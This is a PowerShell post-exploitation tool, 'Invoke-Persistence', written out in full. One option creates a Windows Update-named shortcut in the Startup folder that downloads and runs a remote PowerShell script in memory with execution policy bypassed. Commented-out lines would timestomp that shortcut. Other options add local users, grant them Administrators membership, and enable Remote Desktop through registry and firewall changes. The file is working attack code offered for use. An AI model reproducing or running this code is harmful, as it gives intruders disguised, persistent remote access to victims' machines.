function Invoke-Persistence {
[CmdletBinding()]
param (
	[Parameter(ParameterSetName = 'Help', Position=1)]
	[Switch]$Help,
	
	[Parameter(ParameterSetName = 'ListCommands')]
	[switch]$List,
	
	[Parameter(ParameterSetName = 'StartupLnk')]
	[Switch]$StartupLnk,
	[String]$PsFileUrl,
	[Switch]$Clean,
	
	[Parameter(ParameterSetName = 'AddUser')]
	[Switch]$AddUser,
	[String]$UserName,
	[String]$Password,
	[Switch]$Admin,
	[Switch]$Delete,
	
	[Parameter(ParameterSetName = 'RemoteDesktop')]
	[Switch]$EnableRdp,
	[String]$RdpUser
	
)

$TimeSource = (Get-Item C:\windows\system32\cmd.exe).FullName

	if ($Help -eq $True) {
		Write @"
		
 ### Invoke-Persistence HELP ###
 -------------------------------
 
 Invoke-Persistence [-command] [-parameter(s)]
 
 Available Invoke-Persistence Commands:
 --------------------------------------
 /-----------------------------------------------------------------------------/
 | -StartupLnk [-Clean] [-PsFileUrl] File_url                                  |
 | --------------------------------------------------------------------------- |
 |                                                                             |
 |  [*] Description: Drops a .LNK file in the current user's startup           |
 |      directory that executes a remotely hosted PowerShell script in         |
 |      memory (Net.WebClient DownloadString).                                 |
 |                                                                             |
 |  [*] Mitre ATT&CK Ref: T1060 (Registry Run Keys / Startup Folder)           |
 |     (https://attack.mitre.org/techniques/T1060/)                            |
 |                                                                             |
 |  [*] Usage: Invoke-Persistence -StartupLnk https://yourserver/script.ps1    |
 |  [*] Usage: Invoke-Persistence -StartupLnk -Clean                           |
 |      Removes startup lnk.                                                   |
 /-----------------------------------------------------------------------------/

 /-----------------------------------------------------------------------------/
 | -Adduser [-Username] username [-Password] password [-Admin] [-Delete]       |
 | --------------------------------------------------------------------------- |
 |                                                                             |
 |  [*] Description: Adds a local user. If the [-Admin] parameter is           |
 |      specified, adds an existing user to the local Administrators           |
 |      group. Use the [-Delete] param to delete a user.                       |
 |      (Requires Elevation)                                                   |
 |                                                                             |
 |  [*] Usage: Invoke-Persistence -adduser -username user2 -password "p@a55wrd"|
 |  [*] Usage: Invoke-Persistence -adduser -username user2 -admin              |
 |  [*] Usage: Invoke-Persistence -adduser -username user2 -delete             |
 /-----------------------------------------------------------------------------/
 
 /-----------------------------------------------------------------------------/
 | -EnableRdp [-RdpUser] user                                                  |
 | --------------------------------------------------------------------------- |
 |                                                                             |
 |  [*] Description: Enables remote desktop on the target, and adds an existing|
 |  user to the Remote Desktop users group.                                    |
 |                                                                             |
 |      (Requires Elevation)                                                   |
 |                                                                             |
 |  [*] Usage: Invoke-Persistence -EnableRdp -RdpUser tjones                   |
 /-----------------------------------------------------------------------------/
 
"@
	}
	elseif ($List -eq $True) {
		Write @"
 
 Invoke-Persistence Command List:
 --------------------------------
 Invoke-Persistence -StartupLnk [-Clean] [-PsFileUrl] ps_file_url 
 Invoke-Persistence -Adduser [-Username] username [-Password] password [-Admin] [-Delete]
 Invoke-Persistence -EnableRdp [-RdpUser] user
 
"@
	}
	
	elseif ($StartupLnk -and $PsFileURL) {
		$StartUp = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup"

		$PSExe = "$pshome\powershell.exe"
		$Wss = New-Object -ComObject WScript.Shell
		$LnkCr = $Wss.CreateShortcut("$StartUp\Windows Update.lnk")
		$LnkCr.TargetPath = $PSExe
		$LnkCr.Arguments =@"
-ep bypass -nop "IEX (New-Object Net.Webclient).downloadstring('$PsFileURL')"
"@
		$LnkCr.Description ="Windows Update"
		$LnkCr.IconLocation = "shell32.dll,14"
		$LnkCr.WorkingDirectory ="C:\Windows\System32"
		$LnkCr.Save()
	
		$LnkExists = (Test-Path "$StartUp\Windows Update.lnk") 
		while ($LnkExists -eq $True) {
			
#			[IO.File]::SetCreationTime("$StartUp\Windows Update.lnk", [IO.File]::GetCreationTime($TimeSource))
#			[IO.File]::SetLastAccessTime("$StartUp\Windows Update.lnk", [IO.File]::GetLastAccessTime($TimeSource))
#			[IO.File]::SetLastWriteTIme("$StartUp\Windows Update.lnk", [IO.File]::GetLastWriteTime($TimeSource))
			
			$h = "`n### Invoke-Persistence(StartupLnk) ###`n"
			$Success = @"

 [+] Success! "Windows Update.lnk" Installed:
	$Startup\Windows Update.lnk file.

 [+] LNK Target:
	$pshome\powershell.exe -ep bypass -nop "IEX (New-Object Net.Webclient).downloadstring('$PsFileURL')"

"@
			$h
			$Success
			$h
			return
		}
	}
	$StartUp = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup"
	$LnkExists = (Test-Path "$StartUp\Windows Update.lnk")
	if ($StartupLnk -and $Clean -and $LnkExists) {
		$h = "`n### Invoke-Persistence(StartupLnk) ###`n"
		Remove-Item "$Startup\Windows Update.lnk"
		$h
		Write "`n [+] Successfully removed $StartUp\Windows Update.lnk`n"
		$h
		return
	}
	elseif ($StartupLnk -and $Clean -and !$LnkExists) {
		$h = "`n### Invoke-Persistence(StartupLnk) ###`n"
		$h
		Write "`n [-] $StartUp\Windows_Update.lnk doesn't exist!`n"
		$h
		return
	}
		
	elseif ($AddUser -and $Username -and $Password) {
		$CheckElevated = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
		if ($CheckElevated -eq $true) {
			$h = "`n### Invoke-Persistence(AddUser) ###`n"
			$h
			(net user $Username $Password /add /y)
			Write " [+] User `"$username`" added."
			$h
		}
		if ($CheckElevated -eq $False) {
			$h = "`n### Invoke-Persistence(AddUser) ###`n"
			$h 
			Write " [-] This function requires elevation. Unable to add user `"$Username`"."
			$h 
			return
		}
	}
	elseif ($Adduser -and $Username -and $Admin) {
		$CheckElevated = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
		if ($CheckElevated -eq $True) {
		
			$h = "`n### Invoke-Persistence(AddUser) ###`n"
			$h 
			(net localgroup `"Administrators`" $UserName /add)
			Write " [+] User `"$Username`" added to the local Administrators group."
			$h
		}
		if ($CheckElevated -eq $False) {
			$h = "`n### Invoke-Persistence(AddUser) ###`n"
			$h 
			Write " [-] This function requires elevation. Unable to add `"$username`" to admins group."
			$h 
			return
		}
	}
	elseif ($Adduser -and $Username -and $Delete) {
		$CheckElevated = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
		if ($CheckElevated -eq $True) {
			$h = "`n### Invoke-Persistence(AddUser) ###`n"
			$h 
			(net user $username /delete)
			Write " [+] User `"$username`" deleted."
			$h
		}
		if ($CheckElevated -eq $False) {
			$h = "`n### Invoke-Persistence(AddUser) ###`n"
			$h 
			Write " [-] This function requires elevation. Unable to delete `"$Username`"."
			$h 
			return
		}
	}
	elseif ($EnableRdp -and $RdpUser) {
		$CheckElevated = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
		if ($CheckElevated -eq $True) {
			Try {
				$h = "`n### Invoke-Persistence(EnableRdp) ###`n"
				$h
				(reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f)
				(reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f)
				(netsh advfirewall firewall set rule group="remote desktop" new enable=yes)
				(net localgroup "Remote Desktop Users" $RdpUser /add)
				Write " [+] Successfully enabled Remote Desktop and added $RdpUser to the Remote Desktop users group."
				$h
			}
			Catch {
				Write " [!] Unknown Error."
			}
		}
		if ($CheckElevated -eq $False) {
			$h = "`n### Invoke-Persistence(EnableRdp) ###`n"
			$h
			Write " [-] This function requires elevation. Unable to enable Remote Desktop."
			$h
		}
	}	
}